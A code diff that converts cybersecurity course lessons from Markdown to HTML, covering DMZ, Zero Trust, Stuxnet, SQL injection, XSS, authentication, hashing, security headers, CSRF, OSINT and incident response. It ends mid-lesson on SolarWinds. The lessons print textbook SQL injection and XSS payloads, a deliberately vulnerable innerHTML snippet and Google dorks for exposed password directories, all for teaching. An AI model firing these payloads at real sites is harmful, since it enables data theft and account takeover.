-- Reverse proxies / load balancers
+<p><strong>What goes in the DMZ:</strong></p>
+<ul>
+<li>Web servers (public-facing)</li>
+<li>Email servers (MX records)</li>
+<li>DNS servers (public)</li>
+<li>VPN gateways</li>
+<li>Reverse proxies / load balancers</li>
+</ul>
 
-**Why DMZ matters:**
-- If a web server is hacked, the attacker is stuck in the DMZ
-- The inner firewall prevents access to the real data
-- Without DMZ: hacked web server = direct access to database`
+<p><strong>Why DMZ matters:</strong></p>
+<ul>
+<li>If a web server is hacked, the attacker is stuck in the DMZ</li>
+<li>The inner firewall prevents access to the real data</li>
+<li>Without DMZ: hacked web server = direct access to database</li>
+</ul>`
       },
       {},
       {
         titleEn: "Zero Trust (ZTNA)",
-        contentEn: `**Zero Trust** = "Never trust, always verify." No user or device is trusted by default — even if they are inside the network.
+        contentEn: `<p><strong>Zero Trust</strong> = "Never trust, always verify." No user or device is trusted by default — even if they are inside the network.</p>
 
-**Traditional model (castle and moat):**
-- Firewall protects the perimeter
-- Once inside, you can access everything
-- Problem: if attacker gets in, they move freely (lateral movement)
+<p><strong>Traditional model (castle and moat):</strong></p>
+<ul>
+<li>Firewall protects the perimeter</li>
+<li>Once inside, you can access everything</li>
+<li>Problem: if attacker gets in, they move freely (lateral movement)</li>
+</ul>
 
-**Zero Trust principles:**
-1. **Verify explicitly** — authenticate and authorize every request
-2. **Least privilege** — give minimum access needed, for minimum time
-3. **Assume breach** — design as if attackers are already inside
+<p><strong>Zero Trust principles:</strong></p>
+<ol>
+<li><strong>Verify explicitly</strong> — authenticate and authorize every request</li>
+<li><strong>Least privilege</strong> — give minimum access needed, for minimum time</li>
+<li><strong>Assume breach</strong> — design as if attackers are already inside</li>
+</ol>
 
-**How Zero Trust works:**
-- **Identity** — strong authentication (MFA) for every access
-- **Device** — check device health (updated? encrypted? managed?)
-- **Network** — micro-segmentation (each app is isolated)
-- **Application** — per-app access (not full network VPN)
-- **Data** — classify and encrypt sensitive data
-- **Monitoring** — continuous verification, not just at login
+<p><strong>How Zero Trust works:</strong></p>
+<ul>
+<li><strong>Identity</strong> — strong authentication (MFA) for every access</li>
+<li><strong>Device</strong> — check device health (updated? encrypted? managed?)</li>
+<li><strong>Network</strong> — micro-segmentation (each app is isolated)</li>
+<li><strong>Application</strong> — per-app access (not full network VPN)</li>
+<li><strong>Data</strong> — classify and encrypt sensitive data</li>
+<li><strong>Monitoring</strong> — continuous verification, not just at login</li>
+</ul>
 
-**Real-world example:**
-- Old way: VPN → access entire corporate network
-- Zero Trust: authenticate → verify device → access only the specific app you need → re-verify continuously
+<p><strong>Real-world example:</strong></p>
+<ul>
+<li>Old way: VPN → access entire corporate network</li>
+<li>Zero Trust: authenticate → verify device → access only the specific app you need → re-verify continuously</li>
+</ul>
 
-**Key technologies:** Identity Provider (Azure AD/Okta), MFA, micro-segmentation, ZTNA proxies (Zscaler, Cloudflare Access)`
+<p><strong>Key technologies:</strong> Identity Provider (Azure AD/Okta), MFA, micro-segmentation, ZTNA proxies (Zscaler, Cloudflare Access)</p>`
       },
       {
         titleEn: "Story: Stuxnet — The First Cyber Weapon",
-        contentEn: `In 2010, researchers discovered **Stuxnet** — a computer worm designed to physically destroy Iran's nuclear centrifuges.
+        contentEn: `<p>In 2010, researchers discovered <strong>Stuxnet</strong> — a computer worm designed to physically destroy Iran's nuclear centrifuges.</p>
 
-**What Stuxnet did:**
-- Targeted Siemens SCADA systems controlling uranium enrichment centrifuges
-- Changed the speed of centrifuges (too fast, then too slow)
-- While displaying **normal readings** to the operators
-- Destroyed approximately **1,000 centrifuges** at Natanz facility
+<p><strong>What Stuxnet did:</strong></p>
+<ul>
+<li>Targeted Siemens SCADA systems controlling uranium enrichment centrifuges</li>
+<li>Changed the speed of centrifuges (too fast, then too slow)</li>
+<li>While displaying <strong>normal readings</strong> to the operators</li>
+<li>Destroyed approximately <strong>1,000 centrifuges</strong> at Natanz facility</li>
+</ul>
 
-**How it spread:**
-- Via **USB drives** (the facility was air-gapped — not connected to internet)
-- Used **4 zero-day exploits** (unknown vulnerabilities) — extremely rare
-- Only activated on systems with specific Siemens software + specific configuration
-- Infected 200,000+ computers worldwide but only damaged the target
+<p><strong>How it spread:</strong></p>
+<ul>
+<li>Via <strong>USB drives</strong> (the facility was air-gapped — not connected to internet)</li>
+<li>Used <strong>4 zero-day exploits</strong> (unknown vulnerabilities) — extremely rare</li>
+<li>Only activated on systems with specific Siemens software + specific configuration</li>
+<li>Infected 200,000+ computers worldwide but only damaged the target</li>
+</ul>
 
-**Why it's historic:**
-- First known **cyberweapon** designed to cause physical damage
-- Attributed to USA and Israel (never officially confirmed)
-- Changed warfare — showed that code can destroy physical infrastructure
-- Led to the creation of US Cyber Command
+<p><strong>Why it's historic:</strong></p>
+<ul>
+<li>First known <strong>cyberweapon</strong> designed to cause physical damage</li>
+<li>Attributed to USA and Israel (never officially confirmed)</li>
+<li>Changed warfare — showed that code can destroy physical infrastructure</li>
+<li>Led to the creation of US Cyber Command</li>
+</ul>
 
-**Defense lessons:**
-- Air gaps are not enough (USB drives bypass them)
-- Industrial control systems (ICS/SCADA) need security updates
-- Supply chain attacks are real — inspect everything entering secure facilities
-- Monitor for unusual behavior, not just known malware signatures`
+<p><strong>Defense lessons:</strong></p>
+<ul>
+<li>Air gaps are not enough (USB drives bypass them)</li>
+<li>Industrial control systems (ICS/SCADA) need security updates</li>
+<li>Supply chain attacks are real — inspect everything entering secure facilities</li>
+<li>Monitor for unusual behavior, not just known malware signatures</li>
+</ul>`
       }
     ]
   },
@@ -4976,76 +5180,100 @@ Internet
     pages: [
       {
         titleEn: "SQL Injection Techniques",
-        contentEn: `**Beyond basic SQLi — advanced techniques attackers use:**
+        contentEn: `<p><strong>Beyond basic SQLi — advanced techniques attackers use:</strong></p>
 
-**1. UNION-based SQLi**
-- Combines results from two queries:
-\`\`\`sql
-' UNION SELECT username, password FROM users --
-\`\`\`
-- Attacker must match the number of columns in the original query
-- Used to extract data from other tables
+<p><strong>1. UNION-based SQLi</strong></p>
+<ul>
+<li>Combines results from two queries:</li>
+</ul>
+<pre><code>sql
+<p>' UNION SELECT username, password FROM users --</p>
+</code></pre>
+<ul>
+<li>Attacker must match the number of columns in the original query</li>
+<li>Used to extract data from other tables</li>
+</ul>
 
-**2. Blind SQLi (Boolean-based)**
-- The page doesn't show query results, but behaves differently for true/false
-\`\`\`sql
-' AND 1=1 --   (page loads normally → true)
-' AND 1=2 --   (page shows error → false)
-\`\`\`
-- Attacker asks yes/no questions to extract data one bit at a time
-- Example: "Is the first character of the admin password 'a'?"
+<p><strong>2. Blind SQLi (Boolean-based)</strong></p>
+<ul>
+<li>The page doesn't show query results, but behaves differently for true/false</li>
+</ul>
+<pre><code>sql
+<p>' AND 1=1 --   (page loads normally → true)</p>
+<p>' AND 1=2 --   (page shows error → false)</p>
+</code></pre>
+<ul>
+<li>Attacker asks yes/no questions to extract data one bit at a time</li>
+<li>Example: "Is the first character of the admin password 'a'?"</li>
+</ul>
 
-**3. Time-based Blind SQLi**
-- No visible difference in response. Attacker uses delays:
-\`\`\`sql
-' AND IF(1=1, SLEEP(5), 0) --
-\`\`\`
-- If response takes 5 seconds → condition is true
-- Very slow but works when nothing else does
+<p><strong>3. Time-based Blind SQLi</strong></p>
+<ul>
+<li>No visible difference in response. Attacker uses delays:</li>
+</ul>
+<pre><code>sql
+<p>' AND IF(1=1, SLEEP(5), 0) --</p>
+</code></pre>
+<ul>
+<li>If response takes 5 seconds → condition is true</li>
+<li>Very slow but works when nothing else does</li>
+</ul>
 
-**Defenses (recap):**
-- Parameterized queries / prepared statements — always #1
-- ORM (Object-Relational Mapping) — abstracts SQL away
-- Input validation + WAF as extra layers
-- Regular security testing (SQLMap, Burp Scanner)`
+<p><strong>Defenses (recap):</strong></p>
+<ul>
+<li>Parameterized queries / prepared statements — always #1</li>
+<li>ORM (Object-Relational Mapping) — abstracts SQL away</li>
+<li>Input validation + WAF as extra layers</li>
+<li>Regular security testing (SQLMap, Burp Scanner)</li>
+</ul>`
       },
       {
         titleEn: "XSS Deep Dive",
-        contentEn: `**Three types of XSS in detail:**
+        contentEn: `<p><strong>Three types of XSS in detail:</strong></p>
 
-**1. Stored XSS (Persistent)**
-- Malicious script is saved in the database
-- Every user who views the page executes the script
-- Most dangerous — affects many users automatically
-- Example: attacker posts a comment containing \`<script>...\</script>\`
+<p><strong>1. Stored XSS (Persistent)</strong></p>
+<ul>
+<li>Malicious script is saved in the database</li>
+<li>Every user who views the page executes the script</li>
+<li>Most dangerous — affects many users automatically</li>
+<li>Example: attacker posts a comment containing <code><script>...\</script></code></li>
+</ul>
 
-**2. Reflected XSS (Non-persistent)**
-- Script is part of the URL/request
-- Server includes the input in the response without sanitizing
-- Attacker must trick the victim into clicking a crafted link
-- Example: \`search.php?q=<script>alert(1)</script>\`
+<p><strong>2. Reflected XSS (Non-persistent)</strong></p>
+<ul>
+<li>Script is part of the URL/request</li>
+<li>Server includes the input in the response without sanitizing</li>
+<li>Attacker must trick the victim into clicking a crafted link</li>
+<li>Example: <code>search.php?q=<script>alert(1)</script></code></li>
+</ul>
 
-**3. DOM-based XSS**
-- The vulnerability is in **client-side JavaScript**, not the server
-- The server never sees the malicious input
-- Example: JavaScript reads from \`location.hash\` and writes to \`innerHTML\`
-\`\`\`javascript
-// Vulnerable code
-document.getElementById('output').innerHTML = location.hash.slice(1);
-// Attack URL: page.html#<img src=x onerror=alert(1)>
-\`\`\`
+<p><strong>3. DOM-based XSS</strong></p>
+<ul>
+<li>The vulnerability is in <strong>client-side JavaScript</strong>, not the server</li>
+<li>The server never sees the malicious input</li>
+<li>Example: JavaScript reads from <code>location.hash</code> and writes to <code>innerHTML</code></li>
+</ul>
+<pre><code>javascript
+<p>// Vulnerable code</p>
+<p>document.getElementById('output').innerHTML = location.hash.slice(1);</p>
+<p>// Attack URL: page.html#<img src=x onerror=alert(1)></p>
+</code></pre>
 
-**XSS impact:**
-- Steal session cookies → account takeover
-- Redirect users to phishing pages
-- Capture keystrokes (keylogger)
-- Deface the website
+<p><strong>XSS impact:</strong></p>
+<ul>
+<li>Steal session cookies → account takeover</li>
+<li>Redirect users to phishing pages</li>
+<li>Capture keystrokes (keylogger)</li>
+<li>Deface the website</li>
+</ul>
 
-**Defenses:**
-- Output encoding (HTML entities, JavaScript encoding)
-- Content Security Policy (CSP) header
-- Use frameworks that auto-escape (React, Angular)
-- \`HttpOnly\` flag on cookies (prevents JavaScript access)`
+<p><strong>Defenses:</strong></p>
+<ul>
+<li>Output encoding (HTML entities, JavaScript encoding)</li>
+<li>Content Security Policy (CSP) header</li>
+<li>Use frameworks that auto-escape (React, Angular)</li>
+<li><code>HttpOnly</code> flag on cookies (prevents JavaScript access)</li>
+</ul>`
       }
     ]
   },
@@ -5055,62 +5283,74 @@ document.getElementById('output').innerHTML = location.hash.slice(1);
     pages: [
       {
         titleEn: "Authentication vs Authorization",
-        contentEn: `**Authentication (AuthN)** = verifying **who you are**
-**Authorization (AuthZ)** = verifying **what you can do**
+        contentEn: `<p><strong>Authentication (AuthN)</strong> = verifying <strong>who you are</strong></p>
+<p><strong>Authorization (AuthZ)</strong> = verifying <strong>what you can do</strong></p>
 
-**Example:**
-- You show your ID at the door → Authentication
-- The guard checks if you can enter the VIP room → Authorization
+<p><strong>Example:</strong></p>
+<ul>
+<li>You show your ID at the door → Authentication</li>
+<li>The guard checks if you can enter the VIP room → Authorization</li>
+</ul>
 
-**Authentication factors:**
-- **Something you know** — password, PIN
-- **Something you have** — phone (OTP), security key (YubiKey)
-- **Something you are** — fingerprint, face scan
+<p><strong>Authentication factors:</strong></p>
+<ul>
+<li><strong>Something you know</strong> — password, PIN</li>
+<li><strong>Something you have</strong> — phone (OTP), security key (YubiKey)</li>
+<li><strong>Something you are</strong> — fingerprint, face scan</li>
+</ul>
 
-**MFA (Multi-Factor Authentication):**
-- Uses 2+ factors from different categories
-- Password + SMS code = MFA (know + have)
-- Password + security question = NOT MFA (both are "know")
+<p><strong>MFA (Multi-Factor Authentication):</strong></p>
+<ul>
+<li>Uses 2+ factors from different categories</li>
+<li>Password + SMS code = MFA (know + have)</li>
+<li>Password + security question = NOT MFA (both are "know")</li>
+</ul>
 
-**Common authentication methods:**
-- **Session-based** — server stores session, sends cookie to browser
-- **Token-based (JWT)** — server sends signed token, client includes it in every request
-- **OAuth 2.0** — "Login with Google/GitHub" — delegated authorization
-- **SSO** — one login for multiple apps (Azure AD, Okta)
+<p><strong>Common authentication methods:</strong></p>
+<ul>
+<li><strong>Session-based</strong> — server stores session, sends cookie to browser</li>
+<li><strong>Token-based (JWT)</strong> — server sends signed token, client includes it in every request</li>
+<li><strong>OAuth 2.0</strong> — "Login with Google/GitHub" — delegated authorization</li>
+<li><strong>SSO</strong> — one login for multiple apps (Azure AD, Okta)</li>
+</ul>
 
-**Common mistakes:**
-- Storing passwords in plain text (use hashing!)
-- No account lockout after failed attempts
-- Session tokens that never expire
-- No MFA on admin accounts`
+<p><strong>Common mistakes:</strong></p>
+<ul>
+<li>Storing passwords in plain text (use hashing!)</li>
+<li>No account lockout after failed attempts</li>
+<li>Session tokens that never expire</li>
+<li>No MFA on admin accounts</li>
+</ul>`
       },
       {
         titleEn: "Password Hashing",
-        contentEn: `**Never store passwords in plain text.** Use hashing.
+        contentEn: `<p><strong>Never store passwords in plain text.</strong> Use hashing.</p>
 
-**Hashing** = one-way function that turns a password into a fixed-length string.
-\`\`\`
-"mypassword" → hash() → "5f4dcc3b5aa765d61d8327deb882cf99"
-\`\`\`
-You cannot reverse a hash back to the original password.
+<p><strong>Hashing</strong> = one-way function that turns a password into a fixed-length string.</p>
+<pre><code>"mypassword" → hash() → "5f4dcc3b5aa765d61d8327deb882cf99"
+</code></pre>
+<p>You cannot reverse a hash back to the original password.</p>
 
-**Why plain hashing is not enough:**
-- **Rainbow tables** — precomputed hashes for millions of common passwords
-- If two users have the same password → same hash → attacker knows
+<p><strong>Why plain hashing is not enough:</strong></p>
+<ul>
+<li><strong>Rainbow tables</strong> — precomputed hashes for millions of common passwords</li>
+<li>If two users have the same password → same hash → attacker knows</li>
+</ul>
 
-**Salt** = random value added to each password before hashing:
-\`\`\`
-"mypassword" + "x7Kp9" → hash() → "a1b2c3..."  (user 1)
-"mypassword" + "Qm3rZ" → hash() → "d4e5f6..."  (user 2)
-\`\`\`
-Same password, different salt → different hash. Rainbow tables become useless.
+<p><strong>Salt</strong> = random value added to each password before hashing:</p>
+<pre><code>"mypassword" + "x7Kp9" → hash() → "a1b2c3..."  (user 1)
+<p>"mypassword" + "Qm3rZ" → hash() → "d4e5f6..."  (user 2)</p>
+</code></pre>
+<p>Same password, different salt → different hash. Rainbow tables become useless.</p>
 
-**Recommended algorithms:**
-- **bcrypt** — most widely used, has built-in salt, adjustable cost factor
-- **Argon2** — newest, winner of Password Hashing Competition (2015), memory-hard (resists GPU attacks)
-- **scrypt** — memory-hard alternative to bcrypt
+<p><strong>Recommended algorithms:</strong></p>
+<ul>
+<li><strong>bcrypt</strong> — most widely used, has built-in salt, adjustable cost factor</li>
+<li><strong>Argon2</strong> — newest, winner of Password Hashing Competition (2015), memory-hard (resists GPU attacks)</li>
+<li><strong>scrypt</strong> — memory-hard alternative to bcrypt</li>
+</ul>
 
-**Do NOT use:** MD5, SHA-1, SHA-256 for passwords (too fast → easy to brute force)`
+<p><strong>Do NOT use:</strong> MD5, SHA-1, SHA-256 for passwords (too fast → easy to brute force)</p>`
       }
     ]
   },
@@ -5120,70 +5360,90 @@ Same password, different salt → different hash. Rainbow tables become useless.
     pages: [
       {
         titleEn: "HTTP Security Headers",
-        contentEn: `**Security headers** are HTTP response headers that tell the browser how to behave securely.
+        contentEn: `<p><strong>Security headers</strong> are HTTP response headers that tell the browser how to behave securely.</p>
 
-**Content-Security-Policy (CSP):**
-- Controls which resources (scripts, styles, images) can load
-- Prevents XSS by blocking inline scripts
-\`\`\`
-Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
-\`\`\`
-- Only scripts from your domain and cdn.example.com will run
+<p><strong>Content-Security-Policy (CSP):</strong></p>
+<ul>
+<li>Controls which resources (scripts, styles, images) can load</li>
+<li>Prevents XSS by blocking inline scripts</li>
+</ul>
+<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
+</code></pre>
+<ul>
+<li>Only scripts from your domain and cdn.example.com will run</li>
+</ul>
 
-**Strict-Transport-Security (HSTS):**
-- Forces HTTPS — browser will never use HTTP for this domain
-\`\`\`
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-\`\`\`
-- Prevents SSL stripping attacks (MITM downgrades HTTPS to HTTP)
+<p><strong>Strict-Transport-Security (HSTS):</strong></p>
+<ul>
+<li>Forces HTTPS — browser will never use HTTP for this domain</li>
+</ul>
+<pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+</code></pre>
+<ul>
+<li>Prevents SSL stripping attacks (MITM downgrades HTTPS to HTTP)</li>
+</ul>
 
-**X-Frame-Options:**
-- Prevents your page from being loaded in an iframe
-\`\`\`
-X-Frame-Options: DENY
-\`\`\`
-- Defends against **clickjacking** (invisible iframe over a real page)
+<p><strong>X-Frame-Options:</strong></p>
+<ul>
+<li>Prevents your page from being loaded in an iframe</li>
+</ul>
+<pre><code>X-Frame-Options: DENY
+</code></pre>
+<ul>
+<li>Defends against <strong>clickjacking</strong> (invisible iframe over a real page)</li>
+</ul>
 
-**Other important headers:**
-- **X-Content-Type-Options: nosniff** — prevents MIME type sniffing
-- **Referrer-Policy: strict-origin** — controls what URL info is sent to other sites
-- **Permissions-Policy** — disables browser features (camera, microphone, geolocation)
+<p><strong>Other important headers:</strong></p>
+<ul>
+<li><strong>X-Content-Type-Options: nosniff</strong> — prevents MIME type sniffing</li>
+<li><strong>Referrer-Policy: strict-origin</strong> — controls what URL info is sent to other sites</li>
+<li><strong>Permissions-Policy</strong> — disables browser features (camera, microphone, geolocation)</li>
+</ul>
 
-**Check your headers:** Use securityheaders.com to scan your site (grade A-F)`
+<p><strong>Check your headers:</strong> Use securityheaders.com to scan your site (grade A-F)</p>`
       },
       {
         titleEn: "CSRF Tokens & SameSite Cookies",
-        contentEn: `**CSRF (Cross-Site Request Forgery)** — the browser sends your cookies automatically, even from a malicious site.
+        contentEn: `<p><strong>CSRF (Cross-Site Request Forgery)</strong> — the browser sends your cookies automatically, even from a malicious site.</p>
 
-**Defense 1: CSRF Tokens**
-- Server generates a random token for each session/form
-- Token is included in every form as a hidden field
-\`\`\`html
+<p><strong>Defense 1: CSRF Tokens</strong></p>
+<ul>
+<li>Server generates a random token for each session/form</li>
+<li>Token is included in every form as a hidden field</li>
+</ul>
+<pre><code>html
 <form action="/transfer" method="POST">
   <input type="hidden" name="csrf_token" value="a1b2c3d4e5">
   <input name="amount" value="100">
   <button>Transfer</button>
 </form>
-\`\`\`
-- Server checks: does the token match? If not → reject
-- Attacker cannot guess the token → attack fails
+</code></pre>
+<ul>
+<li>Server checks: does the token match? If not → reject</li>
+<li>Attacker cannot guess the token → attack fails</li>
+</ul>
 
-**Defense 2: SameSite Cookies**
-- Cookie attribute that controls when cookies are sent cross-site
-\`\`\`
-Set-Cookie: session=abc123; SameSite=Strict
-\`\`\`
+<p><strong>Defense 2: SameSite Cookies</strong></p>
+<ul>
+<li>Cookie attribute that controls when cookies are sent cross-site</li>
+</ul>
+<pre><code>Set-Cookie: session=abc123; SameSite=Strict
+</code></pre>
 
-**SameSite values:**
-- **Strict** — cookie is never sent cross-site (safest, but breaks some links)
-- **Lax** — cookie sent on top-level navigation (GET only), not on POST/forms from other sites. **Default in modern browsers.**
-- **None** — cookie always sent (must use Secure flag with HTTPS)
+<p><strong>SameSite values:</strong></p>
+<ul>
+<li><strong>Strict</strong> — cookie is never sent cross-site (safest, but breaks some links)</li>
+<li><strong>Lax</strong> — cookie sent on top-level navigation (GET only), not on POST/forms from other sites. <strong>Default in modern browsers.</strong></li>
+<li><strong>None</strong> — cookie always sent (must use Secure flag with HTTPS)</li>
+</ul>
 
-**Defense 3: Check Origin/Referer headers**
-- Server checks where the request came from
-- If origin doesn't match your domain → reject
+<p><strong>Defense 3: Check Origin/Referer headers</strong></p>
+<ul>
+<li>Server checks where the request came from</li>
+<li>If origin doesn't match your domain → reject</li>
+</ul>
 
-**Best practice:** Use CSRF tokens + SameSite=Lax + check Origin header. Defense in depth.`
+<p><strong>Best practice:</strong> Use CSRF tokens + SameSite=Lax + check Origin header. Defense in depth.</p>`
       }
     ]
   },
@@ -5193,67 +5453,85 @@ Set-Cookie: session=abc123; SameSite=Strict
     pages: [
       {
         titleEn: "Threat Intelligence Levels",
-        contentEn: `**Threat Intelligence** = information about threats that helps you make security decisions.
+        contentEn: `<p><strong>Threat Intelligence</strong> = information about threats that helps you make security decisions.</p>
 
-**Three levels:**
+<p><strong>Three levels:</strong></p>
 
-**1. Tactical (Technical)**
-- IOCs (Indicators of Compromise): malicious IPs, domains, file hashes
-- Used by: SOC analysts, SIEM rules, firewall blocks
-- Lifespan: hours to days (attackers change infrastructure often)
-- Example: "Block IP 203.0.113.42 — it's a C2 server for Cobalt Strike"
+<p><strong>1. Tactical (Technical)</strong></p>
+<ul>
+<li>IOCs (Indicators of Compromise): malicious IPs, domains, file hashes</li>
+<li>Used by: SOC analysts, SIEM rules, firewall blocks</li>
+<li>Lifespan: hours to days (attackers change infrastructure often)</li>
+<li>Example: "Block IP 203.0.113.42 — it's a C2 server for Cobalt Strike"</li>
+</ul>
 
-**2. Operational**
-- TTPs (Tactics, Techniques, and Procedures) — how attackers operate
-- Used by: incident responders, threat hunters
-- Lifespan: months (attackers reuse methods)
-- Frameworks: **MITRE ATT&CK** — maps all known attacker techniques
-- Example: "APT29 uses spear phishing with OAuth tokens to access cloud email"
+<p><strong>2. Operational</strong></p>
+<ul>
+<li>TTPs (Tactics, Techniques, and Procedures) — how attackers operate</li>
+<li>Used by: incident responders, threat hunters</li>
+<li>Lifespan: months (attackers reuse methods)</li>
+<li>Frameworks: <strong>MITRE ATT&CK</strong> — maps all known attacker techniques</li>
+<li>Example: "APT29 uses spear phishing with OAuth tokens to access cloud email"</li>
+</ul>
 
-**3. Strategic**
-- High-level trends, geopolitical context, risk assessment
-- Used by: CISO, board of directors, executives
-- Lifespan: months to years
-- Example: "Ransomware attacks on healthcare increased 94% this year. Budget for backup infrastructure."
+<p><strong>3. Strategic</strong></p>
+<ul>
+<li>High-level trends, geopolitical context, risk assessment</li>
+<li>Used by: CISO, board of directors, executives</li>
+<li>Lifespan: months to years</li>
+<li>Example: "Ransomware attacks on healthcare increased 94% this year. Budget for backup infrastructure."</li>
+</ul>
 
-**Threat Intelligence sources:**
-- **Open source (OSINT)** — free: VirusTotal, AlienVault OTX, MITRE ATT&CK
-- **Commercial** — paid feeds: Recorded Future, Mandiant, CrowdStrike
-- **Government** — CISA alerts, FBI flash reports
-- **ISACs** — industry-specific sharing (Financial ISAC, Health ISAC)`
+<p><strong>Threat Intelligence sources:</strong></p>
+<ul>
+<li><strong>Open source (OSINT)</strong> — free: VirusTotal, AlienVault OTX, MITRE ATT&CK</li>
+<li><strong>Commercial</strong> — paid feeds: Recorded Future, Mandiant, CrowdStrike</li>
+<li><strong>Government</strong> — CISA alerts, FBI flash reports</li>
+<li><strong>ISACs</strong> — industry-specific sharing (Financial ISAC, Health ISAC)</li>
+</ul>`
       },
       {
         titleEn: "OSINT Tools & Techniques",
-        contentEn: `**OSINT** (Open Source Intelligence) = gathering information from publicly available sources.
+        contentEn: `<p><strong>OSINT</strong> (Open Source Intelligence) = gathering information from publicly available sources.</p>
 
-**Key tools:**
+<p><strong>Key tools:</strong></p>
 
-**Shodan** — "Search engine for the Internet of Things"
-- Finds internet-connected devices: webcams, servers, routers, SCADA
-- Search: \`port:3389 country:US\` → find open Remote Desktop servers in the US
-- Useful for: finding exposed services your organization didn't know about
+<p><strong>Shodan</strong> — "Search engine for the Internet of Things"</p>
+<ul>
+<li>Finds internet-connected devices: webcams, servers, routers, SCADA</li>
+<li>Search: <code>port:3389 country:US</code> → find open Remote Desktop servers in the US</li>
+<li>Useful for: finding exposed services your organization didn't know about</li>
+</ul>
 
-**Censys** — similar to Shodan, focused on certificates and web services
-- Search by SSL certificate details, HTTP response headers
-- Find all servers using a specific certificate or technology
+<p><strong>Censys</strong> — similar to Shodan, focused on certificates and web services</p>
+<ul>
+<li>Search by SSL certificate details, HTTP response headers</li>
+<li>Find all servers using a specific certificate or technology</li>
+</ul>
 
-**WHOIS / DNS tools**
-- \`whois example.com\` — who registered the domain? When? Contact info?
-- \`dig example.com\` — DNS records (A, MX, NS, TXT)
-- **SecurityTrails** — historical DNS data (what did this domain point to last year?)
+<p><strong>WHOIS / DNS tools</strong></p>
+<ul>
+<li><code>whois example.com</code> — who registered the domain? When? Contact info?</li>
+<li><code>dig example.com</code> — DNS records (A, MX, NS, TXT)</li>
+<li><strong>SecurityTrails</strong> — historical DNS data (what did this domain point to last year?)</li>
+</ul>
 
-**Google Dorking** — advanced Google searches to find sensitive info:
-- \`site:example.com filetype:pdf\` — find PDFs on a domain
-- \`intitle:"index of" password\` — find exposed directories
-- \`inurl:admin login\` — find admin login pages
+<p><strong>Google Dorking</strong> — advanced Google searches to find sensitive info:</p>
+<ul>
+<li><code>site:example.com filetype:pdf</code> — find PDFs on a domain</li>
+<li><code>intitle:"index of" password</code> — find exposed directories</li>
+<li><code>inurl:admin login</code> — find admin login pages</li>
+</ul>
 
-**Other OSINT tools:**
-- **theHarvester** — collect emails, subdomains, IPs from public sources
-- **Maltego** — visual link analysis (connects people, domains, IPs)
-- **Recon-ng** — modular recon framework (like Metasploit for OSINT)
-- **Have I Been Pwned** — check if your email/password was leaked
+<p><strong>Other OSINT tools:</strong></p>
+<ul>
+<li><strong>theHarvester</strong> — collect emails, subdomains, IPs from public sources</li>
+<li><strong>Maltego</strong> — visual link analysis (connects people, domains, IPs)</li>
+<li><strong>Recon-ng</strong> — modular recon framework (like Metasploit for OSINT)</li>
+<li><strong>Have I Been Pwned</strong> — check if your email/password was leaked</li>
+</ul>
 
-**Ethics:** OSINT is legal (public data) but use it responsibly. Don't access systems you find — just report.`
+<p><strong>Ethics:</strong> OSINT is legal (public data) but use it responsibly. Don't access systems you find — just report.</p>`
       }
     ]
   },
@@ -5263,76 +5541,98 @@ Set-Cookie: session=abc123; SameSite=Strict
     pages: [
       {
         titleEn: "The 6 Phases of Incident Response (NIST)",
-        contentEn: `When a security incident happens, you need a structured response. NIST defines 6 phases:
+        contentEn: `<p>When a security incident happens, you need a structured response. NIST defines 6 phases:</p>
 
-**1. Preparation**
-- Build an IR team with clear roles
-- Write playbooks for common incidents (ransomware, data breach, DDoS)
-- Set up tools: SIEM, forensic workstations, communication channels
-- Run tabletop exercises (simulate incidents)
+<p><strong>1. Preparation</strong></p>
+<ul>
+<li>Build an IR team with clear roles</li>
+<li>Write playbooks for common incidents (ransomware, data breach, DDoS)</li>
+<li>Set up tools: SIEM, forensic workstations, communication channels</li>
+<li>Run tabletop exercises (simulate incidents)</li>
+</ul>
 
-**2. Identification**
-- Detect and confirm the incident
-- Sources: SIEM alerts, user reports, threat intelligence, anomaly detection
-- Key questions: What happened? When? What systems are affected? Is it ongoing?
-- Document everything with timestamps
+<p><strong>2. Identification</strong></p>
+<ul>
+<li>Detect and confirm the incident</li>
+<li>Sources: SIEM alerts, user reports, threat intelligence, anomaly detection</li>
+<li>Key questions: What happened? When? What systems are affected? Is it ongoing?</li>
+<li>Document everything with timestamps</li>
+</ul>
 
-**3. Containment**
-- **Short-term:** isolate affected systems (disconnect from network, disable accounts)
-- **Long-term:** apply temporary fixes while preparing for eradication
-- Preserve evidence (disk images, memory dumps, logs) before making changes
+<p><strong>3. Containment</strong></p>
+<ul>
+<li><strong>Short-term:</strong> isolate affected systems (disconnect from network, disable accounts)</li>
+<li><strong>Long-term:</strong> apply temporary fixes while preparing for eradication</li>
+<li>Preserve evidence (disk images, memory dumps, logs) before making changes</li>
+</ul>
 
-**4. Eradication**
-- Remove the threat completely (malware, backdoors, compromised accounts)
-- Patch the vulnerability that was exploited
-- Reset all potentially compromised credentials
+<p><strong>4. Eradication</strong></p>
+<ul>
+<li>Remove the threat completely (malware, backdoors, compromised accounts)</li>
+<li>Patch the vulnerability that was exploited</li>
+<li>Reset all potentially compromised credentials</li>
+</ul>
 
-**5. Recovery**
-- Restore systems from clean backups
-- Rebuild compromised systems from scratch (don't trust cleaned systems)
-- Monitor closely for signs of re-infection
-- Gradually bring systems back online
+<p><strong>5. Recovery</strong></p>
+<ul>
+<li>Restore systems from clean backups</li>
+<li>Rebuild compromised systems from scratch (don't trust cleaned systems)</li>
+<li>Monitor closely for signs of re-infection</li>
+<li>Gradually bring systems back online</li>
+</ul>
 
-**6. Lessons Learned**
-- Hold a post-incident review within 1-2 weeks
-- What went well? What went wrong? What do we improve?
-- Update playbooks, detection rules, and security controls
-- Share findings with the team (and industry if appropriate)`
+<p><strong>6. Lessons Learned</strong></p>
+<ul>
+<li>Hold a post-incident review within 1-2 weeks</li>
+<li>What went well? What went wrong? What do we improve?</li>
+<li>Update playbooks, detection rules, and security controls</li>
+<li>Share findings with the team (and industry if appropriate)</li>
+</ul>`
       },
       {
         titleEn: "Story: SolarWinds Supply Chain Attack (2020)",
-        contentEn: `In December 2020, the cybersecurity firm FireEye discovered one of the most sophisticated attacks in history.
+        contentEn: `<p>In December 2020, the cybersecurity firm FireEye discovered one of the most sophisticated attacks in history.</p>
 
-**What happened:**
-- Hackers compromised **SolarWinds Orion** — a network monitoring tool used by 33,000+ organizations
-- They inserted a backdoor (called **SUNBURST**) into a legitimate software update
